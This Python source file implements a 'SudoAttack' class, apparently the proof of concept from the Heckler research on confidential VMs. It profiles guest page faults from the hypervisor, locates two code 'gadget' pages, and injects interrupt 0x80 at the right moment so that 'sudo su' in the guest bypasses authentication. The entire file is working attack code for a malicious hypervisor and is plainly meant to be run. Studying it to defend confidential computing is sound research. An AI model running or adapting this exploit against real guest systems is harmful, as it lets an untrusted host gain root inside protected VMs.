import os
import threading

from rich.live import Live
from rich.prompt import Confirm
from rich.text import Text

from heckler.common import dump_entries
from heckler.boot_filter import LoginBootFilter

from heckler.vm_controller import VmController
import subprocess as subp
from rich.console import Console
import heckler_bindings as h
from ordered_set import OrderedSet
import time

console = Console()

script_dir = os.path.dirname(os.path.realpath(__file__))
vm_run_script = script_dir + "/../../../../run_vm_sudo.sh"
dump_boot_results = script_dir + "/data/boot_results"


def print(msg):
    console.print("\[i] ", style="magenta", end="")
    console.print(msg)


class SudoAttack:
    def __init__(self):
        self.vm_controller = VmController(vm_run_script=vm_run_script,
                                          boot_filter=LoginBootFilter(has_booted_cb=self._on_vm_has_booted))

        self.do_page_tracking = False
        self.pf_analysis = None
        self.vm_booted = False
        self.debugging = False
        pass

    def _on_vm_has_booted(self):
        if not self.vm_booted:
            self.vm_booted = True
            self.do_page_tracking = False
        pass

    def track_trace(self, include_gpas, max_hit=None, timeout_s=None):
        self.do_page_tracking = True

        run_list = []
        run_set = OrderedSet()
        has_max_hit = max_hit is not None
        pfs = {}
        last_gpa = 0
        acked = True
        errors = 0

        def th_timeout():
            time.sleep(timeout_s)
            self.do_page_tracking = False

        th = threading.Thread(target=th_timeout, args=[], daemon=True)

        h.heckler_init()
        h.heckler_enable_tracking()

        for gpa in include_gpas:
            h.heckler_track_page(gpa)

        if timeout_s is not None:
            th.start()

        try:
            while self.do_page_tracking:
                acked = False
                ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue

                gpa = int(ev.get('gpa'))

                if gpa not in pfs:
                    pfs[gpa] = 0
                pfs[gpa] += 1
                run_list.append(gpa)
                run_set.add(gpa)

                # msg = str(hex(gpa))
                # print(msg)
                if last_gpa != gpa and last_gpa != 0 \
                        and (not has_max_hit or pfs[last_gpa] < max_hit):
                    h.heckler_track_page(last_gpa)

                last_gpa = gpa
                h.heckler_ack_event()
                acked = True

        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)

        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)
                pass

        h.heckler_ack_event()
        h.heckler_untrack_all_pages()
        h.heckler_clean_up()

        pf_analysis = {
            'run_list': run_list,
            'run_set': run_set,
            'pfs': pfs,
        }
        self.do_page_tracking = False
        return pf_analysis

    def track_once(self, boot, gpa_to_track=None, timeout_s=None, event_timeout=False):
        self.do_page_tracking = True

        run_list = []
        run_set = OrderedSet()
        pfs = {}
        acked = True
        errors = 0

        def th_timeout():
            time.sleep(timeout_s)
            self.do_page_tracking = False

        th = threading.Thread(target=th_timeout, args=[], daemon=True)

        h.heckler_init()

        if boot:
            h.heckler_enable_boot_tracking()
            assert gpa_to_track is None or len(gpa_to_track) == 0
        else:
            h.heckler_enable_tracking()
            if gpa_to_track is None or len(gpa_to_track) == 0:
                h.heckler_track_all_pages()

            else:
                for gpa in gpa_to_track:
                    h.heckler_track_page(gpa)

        if timeout_s is not None:
            th.start()
        try:
            while self.do_page_tracking:
                acked = False

                if event_timeout:
                    ev = h.heckler_block_until_event_timeout(5)
                else:
                    ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    if ev is not None:
                        if ev.get('ret') == h.HECKLER_ERR_ABORT:
                            continue
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue

                gpa = int(ev.get('gpa'))

                if gpa not in pfs:
                    pfs[gpa] = 0

                pfs[gpa] += 1
                run_list.append(gpa)
                run_set.add(gpa)

                h.heckler_ack_event()
                acked = True
        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)
        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)
                pass

        h.heckler_untrack_all_pages()
        h.heckler_clean_up()

        pf_analysis = {
            'run_list': run_list,
            'run_set': run_set,
            'pfs': pfs,
        }

        self.do_page_tracking = False
        return pf_analysis

    def _dump(self, txt, obj):
        if self.debugging:
            dump_entries(txt, obj)

    def track_boot(self):
        return self.track_once(boot=True)

    def track_exclude(self, timeout=5):
        return self.track_once(boot=False, timeout_s=timeout)

    def track_ping_pong_once(self, include_set=None, timeout=1, event_timeout=False):
        return self.track_once(boot=False, gpa_to_track=include_set, timeout_s=timeout, event_timeout=event_timeout)

    def track_ping_pong_trace(self, include_set, timeout=1, max_hit=None):
        return self.track_trace(include_gpas=include_set, max_hit=max_hit, timeout_s=timeout)

    def find_gadgets(self, pfs):
        def check_gadgets(pfs, main, gad1, gad2, min_hits=10000):
            main_hits = pfs[main]
            gad1_hits = pfs[gad1]
            gad2_hits = pfs[gad2]

            if gad1_hits < min_hits or gad2_hits < min_hits:
                return False

            if abs(gad1_hits - gad2_hits) > 2:
                print(f"{hex(gad1)}={gad1_hits}, {hex(gad2)}={gad2_hits} no candidates, cardinality too different")
                return False

            if abs(gad1_hits * 2 - main_hits) > 3:
                print(f"{hex(main)}={main_hits} is off, too many compared to gadgets")
                return False

            return True

        if len(pfs) < 3:
            print("error: must profile at least 3 pages. Repeat")
            return None, None

        pfs_list = sorted(pfs.items(), key=lambda item: item[1])

        i = 0
        max_l = len(pfs)
        while i < max_l:
            j = i + 1
            while j < max_l:
                k = j + 1
                while k < max_l:
                    main = pfs_list[max_l - 1 - i][0]
                    gad1 = pfs_list[max_l - 1 - j][0]
                    gad2 = pfs_list[max_l - 1 - k][0]

                    res = check_gadgets(pfs, main, gad1, gad2)
                    if res:
                        return gad1, gad2
                    k = k + 1
                j = j + 1
            i = i + 1
        return None, None

    def inject(self, gad1, gad2):
        self.do_page_tracking = True

        lastlast_gpa = 0
        last_gpa = 0
        h.heckler_init()

        print("Type 'sudo su' to bypass authentication")
        Confirm.ask("Press key to attack...", choices=[''])

        print("Attack active. Waiting for target gadgets...")

        h.heckler_enable_tracking()
        h.heckler_track_page(gad1)
        h.heckler_track_page(gad2)

        acked = True
        errors = 0
        try:
            while self.do_page_tracking:
                acked = False
                ev = h.heckler_block_until_event()
                if ev is None or ev.get('ret') == 1 or ev.get('gpa') == 0:
                    if ev is not None:
                        if ev.get('ret') == h.HECKLER_ERR_ABORT:
                            continue
                    errors = errors + 1
                    if errors > 300:
                        print(ev)
                        print(errors)
                        break
                    else:
                        h.heckler_ack_event()
                        acked = True
                        continue

                gpa = int(ev.get('gpa'))

                if gpa == gad1 and last_gpa == gad2 and lastlast_gpa == gad1:
                    print(f"Injecting interrupt, sequence \[{hex(lastlast_gpa)}, {hex(last_gpa)}, {hex(gpa)}]")
                    h.heckler_inject(0x80)
                    break

                if gpa == gad2 and last_gpa == gad1 and lastlast_gpa == gad2:
                    print(f"Injecting interrupt, sequence \[{hex(lastlast_gpa)}, {hex(last_gpa)}, {hex(gpa)}]")
                    h.heckler_inject(0x80)
                    break

                if last_gpa != gpa and last_gpa != 0:
                    h.heckler_track_page(last_gpa)

                lastlast_gpa = last_gpa
                last_gpa = gpa
                h.heckler_ack_event()
                acked = True

        except Exception as e:
            print(e)
        except KeyboardInterrupt as e:
            print(e)
            pass
        if not acked:
            try:
                h.heckler_ack_event()
            except Exception as e:
                print(e)
                pass

        h.heckler_untrack_all_pages()
        h.heckler_clean_up()
        self.do_page_tracking = False
        pass

    def run(self, trace=False, debugging=False):
        total_exclude_set = OrderedSet()
        total_include_set = OrderedSet()

        #
        # Boot VM
        #
        console.rule("Profiling Boot (S_Boot)")
        self.vm_controller.launch(daemon=True, verbose=True)

        #
        # Create Boot Set
        #
        boot_results = self.track_boot()
        boot_list = boot_results['run_list']
        boot_set = boot_results['run_set']
        total_exclude_set.update(boot_set)
        self._dump('boot_results', boot_results)

        print(f"Collected {len(boot_list)} exclude pages \[include: {len(total_include_set)},"
              f" exclude: {len(total_exclude_set)}]")

        #
        # Create Exclusion Set
        #
        time.sleep(3)
        console.rule("Profiling pages to exclude")

        print(f"Profiling idle execution 1 (S_VM)...")
        exclude_results = self.track_exclude(timeout=2)
        exclude_list = exclude_results['run_list']
        exclude_set = exclude_results['run_set']
        total_exclude_set.update(exclude_set)
        self._dump('exclude_results', exclude_results)

        print(f"Collected {len(exclude_list)} exclude pages \[include: {len(total_include_set)},"
              f" exclude: {len(total_exclude_set)}]")
        time.sleep(1)

        print(f"Profiling idle execution 2 (S_VM)...")
        exclude_results = self.track_exclude(timeout=2)
        exclude_list = exclude_results['run_list']
        exclude_set = exclude_results['run_set']
        total_exclude_set.update(exclude_set)
        self._dump('exclude_results', exclude_results)

        print(f"Collected {len(exclude_list)} exclude pages \[include: {len(total_include_set)},"
              f" exclude: {len(total_exclude_set)}]")

        #
        # Profile Gadgets (ping pong)
        #
        time.sleep(3)
        console.rule("Profiling gadgets (S_App)")
        print("Log into VM and execute gadget profiling.")
        Confirm.ask("Press key when done...", choices=[''])

        print("Listen for pagefaults...")

        track_once = self.track_ping_pong_once(timeout=2)
        include_set = track_once['run_set']
        include_set.difference_update(total_exclude_set)
        self._dump('track_once', track_once)
        total_include_set.update(include_set)

        print(f"Collected {len(include_set)} include pages \[include: {len(total_include_set)},"
              f" exclude: {len(total_exclude_set)}]")

        #
        # Create Application Trace
        #
        time.sleep(3)
        console.rule(f"Profiling application trace (PT_App with |S_App|={len(total_include_set)})")
        track_trace = self.track_ping_pong_trace(total_include_set, timeout=3, max_hit=None)
        trace_list = track_trace['run_list']
        pfs = track_trace['pfs']
        self._dump('track_trace', track_trace)

        print(f"Collected trace of {len(trace_list)} pages (PT_App)")

        #
        # Find gadgets
        #
        print("Found gadgets:")
        pf_sorted = sorted(pfs.items(), key=lambda item: item[1])
        s = {k: v for k, v in pf_sorted}
        for k in s.keys():
            print(f"   - gadget: {hex(k)}={s[k]}")
        gad1, gad2 = self.find_gadgets(pfs)

        #
        # Inject
        #
        if gad1 is not None:
            print(f"Target gadget identified: {hex(gad1)}, {hex(gad2)}")
            self.inject(gad1, gad2)
            print("Done.")
        else:
            print("Attack failed. Retry again")


def __test_inject():
    addr1 = 0x0000000004dcb770
    addr2 = 0x0000000004dbfa0f
    addr1 = addr1 // 4096 * 4096
    addr2 = addr2 // 4096 * 4096
    SudoAttack().inject(addr1, addr2)


if __name__ == '__main__':
    SudoAttack().run()
    # __test_inject()
